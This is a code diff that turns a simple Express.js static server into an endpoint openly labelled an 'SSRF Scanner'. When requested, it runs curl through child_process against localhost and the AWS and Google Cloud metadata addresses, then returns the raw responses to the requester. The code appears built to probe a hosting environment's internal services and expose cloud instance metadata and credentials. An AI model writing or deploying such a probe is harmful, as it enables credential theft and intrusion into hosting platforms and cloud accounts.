@@ -1,14 +1,33 @@
-// index.js
 const express = require("express");
+const { exec } = require("child_process");
+
 const app = express();
-const path = require("path");
+const PORT = 10000;
 
-app.use(express.static(path.join(__dirname)));
+app.get("/ssrf/scan", (req, res) => {
+  const targets = [
+    "http://127.0.0.1:80/",
+    "http://localhost:80/",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+  ];
 
-app.get("/", (req, res) => {
-  res.sendFile(path.join(__dirname, "index.html"));
+  let results = [];
+
+  const runCurl = (index) => {
+    if (index >= targets.length) {
+      return res.send(results.join("\n"));
+    }
+
+    exec(`curl -m 3 -s -i ${targets[index]}`, (error, stdout, stderr) => {
+      results.push(`==> ${targets[index]}\n${stdout || stderr}`);
+      runCurl(index + 1);
+    });
+  };
+
+  runCurl(0);
 });
 
-app.listen(10000, () => {
-  console.log("🔥 Server running at http://localhost:10000");
+app.listen(PORT, () => {
+  console.log(`🔥 SSRF Scanner running on http://localhost:${PORT}`);
 });
